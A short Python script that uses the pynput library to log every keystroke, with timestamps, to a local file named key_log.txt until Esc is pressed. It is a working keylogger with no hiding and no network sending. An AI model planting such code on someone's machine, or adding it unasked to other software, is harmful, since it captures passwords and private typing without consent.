from pynput import keyboard
import logging

log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
